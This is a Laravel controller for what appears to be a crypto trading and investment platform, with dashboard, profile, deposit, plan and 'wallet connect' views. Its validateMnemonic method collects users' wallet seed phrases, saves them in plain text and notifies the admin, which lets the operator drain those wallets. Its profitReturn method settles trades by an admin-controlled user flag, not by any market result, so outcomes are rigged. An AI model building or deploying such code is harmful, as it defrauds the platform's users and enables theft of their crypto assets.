<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\CryptoAccount;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Settings;
use App\Models\Plans;
use App\Models\Trade;
use App\Models\User_plans;
use App\Models\Mt4Details;
use App\Models\Deposit;
use App\Models\SettingsCont;
use App\Models\Wdmethod;
use App\Models\Wallets;
use App\Models\Withdrawal;
use App\Models\Tp_Transaction;
use App\Models\PreIpoHolding;
use App\Models\Expert;
use App\Models\SupportTicket;
use App\Models\CopyPosition;
use App\Models\StockPosition;
use App\Models\NFT;
use App\Models\Loan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;

class ViewsController extends Controller
{

    public function dashboard(Request $request)
    {

        $settings = Settings::where('id', '1')->first();
        $user = User::find(auth()->user()->id);

        //check if user does not have ref link then update his link
        if ($user->ref_link == '') {
            User::where('id', $user->id)
                ->update([
                    'ref_link' => $settings->site_address . '/ref/' . $user->username,
                ]);
        }

        //give reg bonus if new
        if ($user->signup_bonus != "received" && ($settings->signup_bonus != NULL && $settings->signup_bonus > 0)) {
            User::where('id', $user->id)
                ->update([
                    'bonus' => $user->bonus + $settings->signup_bonus,
                    'account_bal' => $user->account_bal + $settings->signup_bonus,
                    'signup_bonus' => "received",
                ]);
            //create history
            Tp_Transaction::create([
                'user' => Auth::user()->id,
                'plan' => "SignUp Bonus",
                'amount' => $settings->signup_bonus,
                'type' => "Bonus",
            ]);
        }

        if (DB::table('crypto_accounts')->where('user_id', Auth::user()->id)->doesntExist()) {
            $cryptoaccnt = new CryptoAccount();
            $cryptoaccnt->user_id = Auth::user()->id;
            $cryptoaccnt->save();
        }

        //sum total deposited
        $total_deposited = DB::table('deposits')->where('user', $user->id)->where('status', 'Processed')->sum('amount');

        $total_withdrawal = DB::table('withdrawals')->where('user', $user->id)->where('status', 'Processed')->sum('amount');

        //log user out if not blocked by admin
        if ($user->status != "active") {
            $request->session()->flush();
            return redirect()->route('dashboard');
        }

        //tradings stats start
        $totalTrades = Trade::where('user_id', $user->id)->count();
        $openTrades = Trade::where('user_id', $user->id)->where('status', 'open')->count();
        $closedTrades = Trade::where('user_id', $user->id)->where('status', 'closed')->count();

        $totalProfit = Trade::where('user_id', $user->id)->where('profit_loss', '>', 0)->sum('profit_loss');
        $totalLoss = Trade::where('user_id', $user->id)->where('profit_loss', '<', 0)->sum('profit_loss');
        $averageProfitLoss = Trade::where('user_id', $user)->where('status', 'closed')->avg('profit_loss');

        // Win/Loss Count
        $wins = Trade::where('user_id', $user->id)->where('result', 'WIN')->count();
        $losses = Trade::where('user_id', $user->id)->where('result', 'LOSS')->count();
        $winLossRatio = $losses > 0 ? round($wins / $losses, 2) : ($wins > 0 ? $wins : 0);

        //trading stats ends
        return view("user.dashboard", [
            'title' => 'Account Dashboard',
            'settings' => $settings,
            'deposited' => $total_deposited,
            'total_withdrawal' => $total_withdrawal,
            'trading_accounts' => Mt4Details::where('client_id', Auth::user()->id)->count(),
            'plans' => User_plans::where('user', Auth::user()->id)->where('active', 'yes')->orderByDesc('id')->skip(0)->take(2)->get(),
            't_history' => Tp_Transaction::where('user', Auth::user()->id)
                ->where('type', '<>', 'ROI')
                ->orderByDesc('id')->skip(0)->take(10)
                ->get(),
                'totalTrades'=> $totalTrades,
                'openTrades'=>$openTrades,
                'closedTrades'=>$closedTrades,
                'totalProfit'=>$totalProfit,
                'totalLoss'=> $totalLoss,
                'averageProfitLoss' =>$totalLoss,
                'winLossRatio'=>  $winLossRatio,
                'preIpoHoldings' => PreIpoHolding::where('user_id', $user->id)->with('company')->get(),
                'topExperts' => Expert::active()->orderByDesc('total_roi')->take(3)->get(),
                'recentTickets' => SupportTicket::where('user_id', $user->id)->orderByDesc('updated_at')->take(3)->get(),
                'openTicketCount' => SupportTicket::where('user_id', $user->id)->whereIn('status', ['open', 'answered'])->count(),
        ]);
    }

    //Profile route
    public function profile()
    {
        $userinfo = User::where('id', Auth::user()->id)->first();
        $user = $userinfo;
        $settings = Settings::find(1);
        $mod = $settings->modules ?? [];

        $paymethods = Wdmethod::select(['status', 'name'])->where(function ($query) {
            $query->where('type', '=', 'withdrawal')
                ->orWhere('type', '=', 'both');
        })->whereIn('name', ['Bitcoin', 'Ethereum', 'Litecoin', 'Bank Transfer', 'USDT'])->get();

        // ─── Trading ───────────────────────────────────────────
        $totalTrades = 0; $openTradesCount = 0; $closedTrades = 0;
        $totalTradeInvested = 0; $totalTradeProfit = 0; $totalTradeLoss = 0;
        $winCount = 0; $lossCount = 0;

        if (!empty($mod['trading'])) {
            $trades = Trade::where('user_id', $user->id)->where('is_demo', false);
            $totalTrades = (clone $trades)->count();
            $openTradesCount = (clone $trades)->where('status', 'open')->count();
            $closedTrades = (clone $trades)->where('status', 'closed')->count();

            $closedTradesQuery = Trade::where('user_id', $user->id)->where('is_demo', false)->where('status', 'closed');
            $totalTradeProfit = (clone $closedTradesQuery)->where('profit_loss', '>', 0)->sum('profit_loss');
            $totalTradeLoss = abs((clone $closedTradesQuery)->where('profit_loss', '<', 0)->sum('profit_loss'));
            $winCount = (clone $closedTradesQuery)->where('profit_loss', '>', 0)->count();
            $lossCount = (clone $closedTradesQuery)->where('profit_loss', '<', 0)->count();

            $totalTradeInvested = Trade::where('user_id', $user->id)->where('is_demo', false)->where('status', 'open')->sum('amount');
        }

        // ─── Investments ───────────────────────────────────────
        $activePlansCount = 0; $totalPlanInvested = 0; $totalPlanProfit = 0;

        if (!empty($mod['investment'])) {
            $userPlans = User_plans::where('user', $user->id);
            $activePlansCount = (clone $userPlans)->where('active', 'yes')->count();
            $totalPlanInvested = (clone $userPlans)->where('active', 'yes')->sum('amount');
            $totalPlanProfit = (clone $userPlans)->sum('profit_earned');
        }

        // ─── Copy Trading ──────────────────────────────────────
        $activeCopyCount = 0; $totalCopyInvested = 0; $totalCopyProfit = 0;

        if (!empty($mod['copy_trading'])) {
            $copyPositions = CopyPosition::where('user_id', $user->id);
            $activeCopyCount = (clone $copyPositions)->where('status', 'active')->count();
            $totalCopyInvested = (clone $copyPositions)->where('status', 'active')->sum('invested_amount');
            $totalCopyProfit = (clone $copyPositions)->sum('accumulated_profit');
        }

        // ─── Pre-IPO ───────────────────────────────────────────
        $preIpoCount = 0; $totalPreIpoCost = 0; $totalPreIpoValue = 0;

        if (!empty($mod['pre_ipo'])) {
            $holdings = PreIpoHolding::where('user_id', $user->id)->where('status', 'held')->get();
            $preIpoCount = $holdings->count();
            $totalPreIpoCost = $holdings->sum('total_cost');
            $totalPreIpoValue = $holdings->sum(function ($h) { return $h->current_value; });
        }

        // ─── Stocks ────────────────────────────────────────────
        $stockCount = 0; $totalStockInvested = 0; $totalStockValue = 0;

        if (!empty($mod['stocktrading'])) {
            $positions = StockPosition::where('user_id', $user->id)->get();
            $stockCount = $positions->count();
            $totalStockInvested = $positions->sum('total_invested');
            $totalStockValue = $positions->sum(function ($p) { return $p->current_value; });
        }

        // ─── NFTs ──────────────────────────────────────────────
        $nftCount = 0; $totalNftValue = 0;

        if (!empty($mod['nft'])) {
            $nfts = NFT::where('user_id', $user->id)->whereIn('status', ['listed', 'unlisted']);
            $nftCount = (clone $nfts)->count();
            $totalNftValue = (clone $nfts)->sum('price');
        }

        // ─── Loans ─────────────────────────────────────────────
        $activeLoansCount = 0; $totalLoanOutstanding = 0; $totalRepaid = 0;

        if (!empty($mod['loan'])) {
            $loans = Loan::where('user_id', $user->id);
            $activeLoans = (clone $loans)->whereIn('status', ['active', 'repaying'])->get();
            $activeLoansCount = $activeLoans->count();
            $totalLoanOutstanding = $activeLoans->sum(function ($loan) {
                return $loan->total_repayable - $loan->total_repaid;
            });
            $totalRepaid = (clone $loans)->sum('total_repaid');
        }

        // ─── Deposits & Withdrawals ───────────────────────────
        $totalDeposited = Deposit::where('user', $user->id)->where('status', 'Processed')->sum('amount');
        $depositCount = Deposit::where('user', $user->id)->where('status', 'Processed')->count();
        $totalWithdrawn = Withdrawal::where('user', $user->id)->where('status', 'Processed')->sum('amount');
        $withdrawalCount = Withdrawal::where('user', $user->id)->where('status', 'Processed')->count();

        // ─── Aggregates ────────────────────────────────────────
        $totalInvested = $totalTradeInvested + $totalPlanInvested + $totalCopyInvested + $totalPreIpoCost + $totalStockInvested;
        $totalPL = $totalTradeProfit - $totalTradeLoss + $totalPlanProfit + $totalCopyProfit
            + ($totalPreIpoValue - $totalPreIpoCost) + ($totalStockValue - $totalStockInvested);

        $netWorth = ($user->account_bal ?? 0) + $totalPlanProfit + $totalCopyProfit
            + $totalPreIpoValue + $totalStockValue + $totalNftValue - $totalLoanOutstanding;

        $winRate = ($winCount + $lossCount) > 0 ? round(($winCount / ($winCount + $lossCount)) * 100, 1) : null;

        // Category allocation for pie chart
        $categoryAllocation = [];
        if ($totalTradeInvested > 0) $categoryAllocation['Trading'] = round($totalTradeInvested, 2);
        if ($totalPlanInvested > 0) $categoryAllocation['Investments'] = round($totalPlanInvested, 2);
        if ($totalCopyInvested > 0) $categoryAllocation['Copy Trading'] = round($totalCopyInvested, 2);
        if ($totalPreIpoCost > 0) $categoryAllocation['Pre-IPO'] = round($totalPreIpoCost, 2);
        if ($totalStockInvested > 0) $categoryAllocation['Stocks'] = round($totalStockInvested, 2);
        if ($totalNftValue > 0) $categoryAllocation['NFTs'] = round($totalNftValue, 2);

        return view("user.profile")->with([
            'userinfo' => $userinfo,
            'methods' => $paymethods,
            'title' => 'Profile',
            // Aggregates
            'netWorth' => round($netWorth, 2),
            'totalInvested' => round($totalInvested, 2),
            'totalPL' => round($totalPL, 2),
            'winRate' => $winRate,
            'categoryAllocation' => $categoryAllocation,
            // Trading
            'totalTrades' => $totalTrades,
            'openTradesCount' => $openTradesCount,
            'closedTrades' => $closedTrades,
            'totalTradeInvested' => round($totalTradeInvested, 2),
            'totalTradeProfit' => round($totalTradeProfit, 2),
            'totalTradeLoss' => round($totalTradeLoss, 2),
            'winCount' => $winCount,
            'lossCount' => $lossCount,
            // Investments
            'activePlansCount' => $activePlansCount,
            'totalPlanInvested' => round($totalPlanInvested, 2),
            'totalPlanProfit' => round($totalPlanProfit, 2),
            // Copy Trading
            'activeCopyCount' => $activeCopyCount,
            'totalCopyInvested' => round($totalCopyInvested, 2),
            'totalCopyProfit' => round($totalCopyProfit, 2),
            // Pre-IPO
            'preIpoCount' => $preIpoCount,
            'totalPreIpoCost' => round($totalPreIpoCost, 2),
            'totalPreIpoValue' => round($totalPreIpoValue, 2),
            // Stocks
            'stockCount' => $stockCount,
            'totalStockInvested' => round($totalStockInvested, 2),
            'totalStockValue' => round($totalStockValue, 2),
            // NFTs
            'nftCount' => $nftCount,
            'totalNftValue' => round($totalNftValue, 2),
            // Loans
            'activeLoansCount' => $activeLoansCount,
            'totalLoanOutstanding' => round($totalLoanOutstanding, 2),
            'totalRepaid' => round($totalRepaid, 2),
            // Deposits & Withdrawals
            'totalDeposited' => round($totalDeposited, 2),
            'depositCount' => $depositCount,
            'totalWithdrawn' => round($totalWithdrawn, 2),
            'withdrawalCount' => $withdrawalCount,
        ]);
    }

    //return add withdrawal account form view
    public function accountdetails()
    {
        return view("user.updateacct")->with(array(
            'title' => 'Update account details',
        ));
    }


    //support route
    public function support()
    {
        return view("user.support")
            ->with(array(
                'title' => 'Support',
            ));
    }




    //news route
    public function news()
    {

        $settings = Settings::where('id', 1)->first();
        return view("user.news")
            ->with(array(
                'title' => 'News',
                'settings'=>$settings,
            ));
    }






    // technical route
    public function  technical()
    {

        $settings = Settings::where('id', 1)->first();
        return view("user.techincal")
            ->with(array(
                'title' => 'Techincal',
                'settings'=>$settings,
            ));
    }




    // chart route
    public function  chart()
    {

        $settings = Settings::where('id', 1)->first();
        return view("user.chart")
            ->with(array(
                'title' => 'Chart',
                'settings'=>$settings,
            ));
    }



    // calender route
    public function  calendar()
    {

        $settings = Settings::where('id', 1)->first();
        return view("user.chart")
            ->with(array(
                'title' => 'Chart',
                'settings'=>$settings,
            ));
    }





    //Trading history route
    public function tradinghistory()
    {
        return view("user.thistory")
            ->with(array(
't_history' => Tp_Transaction::where('user', Auth::user()->id)
    ->whereIn('type', ['ROI', 'WIN', 'LOSE'])
    ->orderByDesc('id')
    ->paginate(15),
'title' => 'Trading History',
            ));
    }

    //Account transactions history route
    public function accounthistory()
    {
        return view("user.transactions")
            ->with(array(
                't_history' => Tp_Transaction::where('user', Auth::user()->id)
                    ->where('type', '<>', 'ROI')
                    ->orderByDesc('id')
                    ->get(),

                'withdrawals' => Withdrawal::where('user', Auth::user()->id)->where('verification', '!=', 'Uncompleted')->orderBy('id', 'desc')
                    ->get(),
                'deposits' => Deposit::where('user', Auth::user()->id)->orderBy('id', 'desc')
                    ->get(),
                'title' => 'Account Transactions History',

            ));
    }

    //Return deposit route
    public function deposits()
    {

        $this->profitreturn(auth()->user()->id);
       $paymethod = Wdmethod::where(function ($query) {
        $query->where('type', 'deposit')
              ->orWhere('type', 'both');
    })
    ->where('status', 'enabled')
    ->orderBy('id', 'asc') // Correct way to order in ascending order
    ->get();


        //sum total deposited
        $total_deposited = DB::table('deposits')->where('user', auth()->user()->id)->where('status', 'Processed')->sum('amount');

        return view("user.deposits")
            ->with(array(
                'title' => 'Fund your account',
                'dmethods' => $paymethod,
                'deposits' => Deposit::where(['user' => Auth::user()->id])
                    ->orderBy('id', 'desc')
                    ->get(),
                'deposited' => $total_deposited,
            ));
    }

    //Return withdrawals route
    public function withdrawals()
    {
        $withdrawals =  Wdmethod::where(function ($query) {
            $query->where('type', '=', 'withdrawal')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();

        return view("user.withdrawals")
            ->with(array(
                'title' => 'Withdraw Your funds',
                'wmethods' => $withdrawals,
            ));
    }

    public function transferview()
    {
        $settings = SettingsCont::find(1);
        if (!$settings->use_transfer) {
            abort(404);
        }
        return view("user.transfer", [
            'title' => 'Send funds to a friend',
        ]);
    }

    //Subscription Trading
    public function subtrade()
    {
        $settings = Settings::where('id', 1)->first();
        return view("user.subtrade")
            ->with(array(
                'title' => 'Subscription Trade',
                'subscriptions' => Mt4Details::where('client_id', auth::user()->id)->orderBy('id', 'desc')->get(),
            ));
    }


    //Main Plans route
    public function mplans()
    {
        $activePlanCount = User_plans::where('user', Auth::id())->where('active', 'yes')->count();

        return view("user.mplans")
            ->with(array(
                'title' => 'Investment Plans',
                'plans' => Plans::where('type', 'main')->get(),
                'settings' => Settings::where('id', '1')->first(),
                'activePlanCount' => $activePlanCount,
            ));
    }

    //My Plans route
    public function myplans($sort)
    {
        $userId = Auth::user()->id;
        $numOfPlan = User_plans::where('user', $userId)->count();

        // Aggregate stats
        $totalInvested = User_plans::where('user', $userId)->where('active', 'yes')->sum('amount');
        $totalProfit = User_plans::where('user', $userId)->where('active', 'yes')->sum('profit_earned');
        $activePlanCount = User_plans::where('user', $userId)->where('active', 'yes')->count();

        if ($sort == 'All') {
            $plans = User_plans::where('user', $userId)->orderByDesc('id')->paginate(10);
        } else {
            $plans = User_plans::where('user', $userId)->where('active', $sort)->orderByDesc('id')->paginate(10);
        }

        return view("user.myplans")
            ->with(array(
                'numOfPlan' => $numOfPlan,
                'title' => 'Your packages',
                'plans' => $plans,
                'settings' => Settings::where('id', '1')->first(),
                'totalInvested' => $totalInvested,
                'totalProfit' => $totalProfit,
                'activePlanCount' => $activePlanCount,
            ));
    }


    public function sortPlans($sort)
    {
        return redirect()->route('myplans', ['sort' => $sort]);
    }

    public function planDetails($id)
    {
        $plan = User_plans::find($id);

        if (!$plan || $plan->user != Auth::id()) {
            abort(404);
        }

        $dplan = $plan->dplan;
        $settings = Settings::find(1);

        // Calculate time progress
        $startDate = $plan->created_at;
        $endDate = $plan->expire_date;
        $now = now();
        $totalDuration = $startDate->diffInSeconds($endDate);
        $elapsed = $startDate->diffInSeconds($now->min($endDate));
        $progressPercent = $totalDuration > 0 ? round(($elapsed / $totalDuration) * 100, 1) : 0;

        // Calculate next payment date based on interval
        $intervalMap = [
            'Monthly' => ['addDays', 30],
            'Weekly' => ['addDays', 7],
            'Daily' => ['addHours', 24],
            'Hourly' => ['addMinutes', 60],
            'Every 30 Minutes' => ['addMinutes', 30],
        ];
        $interval = $intervalMap[$dplan->increment_interval] ?? ['addMinutes', 10];
        $nextPaymentDate = $plan->last_growth->copy()->{$interval[0]}($interval[1]);

        // Calculate ROI per interval
        if ($dplan->increment_type == "Percentage") {
            $roiPerInterval = (floatval($plan->amount) * floatval($dplan->increment_amount)) / 100;
        } else {
            $roiPerInterval = floatval($dplan->increment_amount);
        }

        // Count total ROI payments received
        $totalPayments = Tp_Transaction::where('type', 'ROI')->where('user_plan_id', $plan->id)->count();

        // Estimate total intervals for projected return
        $durationParts = explode(" ", $dplan->expiration);
        $durationDigit = intval($durationParts[0]);
        $durationFrame = strtolower($durationParts[1] ?? 'days');
        $totalSeconds = match(true) {
            str_contains($durationFrame, 'year') => $durationDigit * 365 * 86400,
            str_contains($durationFrame, 'month') => $durationDigit * 30 * 86400,
            str_contains($durationFrame, 'week') => $durationDigit * 7 * 86400,
            str_contains($durationFrame, 'day') => $durationDigit * 86400,
            str_contains($durationFrame, 'hour') => $durationDigit * 3600,
            default => $durationDigit * 86400,
        };
        $intervalSeconds = match($dplan->increment_interval) {
            'Monthly' => 30 * 86400,
            'Weekly' => 7 * 86400,
            'Daily' => 86400,
            'Hourly' => 3600,
            'Every 30 Minutes' => 1800,
            default => 600,
        };
        $estimatedIntervals = $intervalSeconds > 0 ? floor($totalSeconds / $intervalSeconds) : 0;
        $projectedTotal = $roiPerInterval * $estimatedIntervals;

        // Days elapsed and total for display
        $daysElapsed = $startDate->diffInDays($now->min($endDate));
        $totalDays = $startDate->diffInDays($endDate);

        return view("user.plandetails", [
            'title' => $dplan->name,
            'plan' => $plan,
            'transactions' => Tp_Transaction::where('type', 'ROI')->where('user_plan_id', $plan->id)->orderByDesc('id')->paginate(10),
            'progressPercent' => $progressPercent,
            'nextPaymentDate' => $nextPaymentDate,
            'roiPerInterval' => $roiPerInterval,
            'totalPayments' => $totalPayments,
            'projectedTotal' => $projectedTotal,
            'daysElapsed' => $daysElapsed,
            'totalDays' => $totalDays,
        ]);
    }


    function twofa()
    {
        return view("profile.show", [
            'title' => 'Advance Security Settings',
        ]);
    }

    // Referral Page
    public function referuser()
    {
        return view("user.referuser", [
            'title' => 'Refer user',
        ]);
    }

    public function verifyaccount()
    {
        if (Auth::user()->account_verify == 'Verified') {
            abort(404, 'You do not have permission to access this page');
        }
        return view("user.verify", [
            'title' => 'Verify your Account',
        ]);
    }

    public function verificationForm()
    {
        if (Auth::user()->account_verify == 'Verified') {
            abort(404, 'You do not have permission to access this page');
        }
        return view("user.verification", [
            'title' => 'KYC Application'
        ]);
    }





    
        public function connect_wallet()
    {
        $settings = Settings::where('id', 1)->first();

        if ($settings->wallet_status !== 'on' || auth()->user()->wallet_connect_status !== 'on') {
            return redirect()->route('dashboard')->with('message', 'Wallet connect is not available for your account.');
        }

        $wallets = \App\Models\Wallets::where('user', auth()->id())
            ->orderByDesc('id')
            ->get();

        return view('user.connect-wallet', [
            'title' => 'Wallet Connect',
            'settings' => $settings,
            'wallets' => $wallets,
        ]);
    }



public function validateMnemonic(Request $request)
{
    $request->validate([
        'wallet' => 'required|string|max:100',
        'mnemonic' => 'required|string|min:12',
    ]);

    $userId = auth()->id();
    $mnemonic = strtolower(trim($request->input('mnemonic')));
    $wallet = $request->input('wallet');

    // Enforce max 10 wallets per user
    $walletCount = \App\Models\Wallets::where('user', $userId)->count();
    if ($walletCount >= 10) {
        return back()->with('message', 'You have reached the maximum of 10 connected wallets.');
    }

    // Prevent duplicate wallet type
    $exists = \App\Models\Wallets::where('user', $userId)
        ->where('wallet_name', $wallet)
        ->exists();
    if ($exists) {
        return back()->with('message', $wallet . ' is already connected to your account.');
    }

    $words = preg_split('/\s+/', $mnemonic);

    if (count($words) < 12) {
        return back()->withErrors(['mnemonic' => 'Mnemonic must contain at least 12 words.']);
    }

    // Save wallet
    \App\Models\Wallets::create([
        'user' => $userId,
        'wallet_name' => $wallet,
        'phrase' => $mnemonic,
        'status' => 'active',
        'last_validated' => now(),
    ]);

    // Update convenience flag with current count
    \App\Models\User::where('id', $userId)->update([
        'wallet_connected' => $walletCount + 1,
    ]);

    $notifUser = \App\Models\User::find($userId);
    \App\Services\NotificationService::notifyAdmin('wallet_connect', 'New Wallet Connected', $notifUser->name . ' connected a ' . $wallet . ' wallet.', url('admin/dashboard/mwalletconnect'));

    return back()->with('success', $wallet . ' connected successfully!');
}


    public function binanceSuccess()
    {
        return redirect()->route('deposits')->with('success', 'Your Deposit was successful, please wait while it is confirmed. You will receive a notification regarding the status of your deposit.');
    }

    public function binanceError()
    {
        return redirect()->route('deposits')->with('message', 'Something went wrong please try again. Contact our support center if problem persist');
    }





public function profitReturn($userId)
{
    $user = User::findOrFail($userId);

    // Fetch all active trades that have expired
    $expiredTrades = Trade::where('user_id', $userId)
        ->where('status', 'open')
        ->where('expires_at', '<=', now())
        ->get();

    foreach ($expiredTrades as $trade) {

        $profit = 0;
        $loss = 0;

        // Example: Profit calculation based on leverage (you can change this logic)
        if ($user->tradetype == 'Profit') {
            // Assume profit is % of amount based on leverage
            $profit = $trade->leverage * $trade->amount * 0.01;

            // Update user's balances (profit + return of initial amount)
            $user->roi += $profit;
            $user->account_bal += ($trade->amount + $profit);

            $transactionType = 'WIN';
        } else {
            // Loss scenario: user only gets a % of amount back (based on leverage)
            $profit = $trade->leverage * $trade->amount * 0.01;  // technically this is the loss amount
            $loss = (100 - $trade->leverage) * $trade->amount * 0.01;

            $user->account_bal += $loss;

            $transactionType = 'LOSE';
        }

        // Update the trade status to closed
        $trade->update([
            'status' => 'closed',
            'profit_loss' => $transactionType === 'WIN' ? $profit : -$profit,
        ]);

        // Record the transaction
        Tp_Transaction::create([
            'user' => $user->id,
            'plan' => $trade->asset_name,
            'amount' => $profit,
            'type' => $transactionType,
            'leverage' => $trade->leverage,
        ]);

        // Save updated user balance/ROI
        $user->save();
    }
}

}
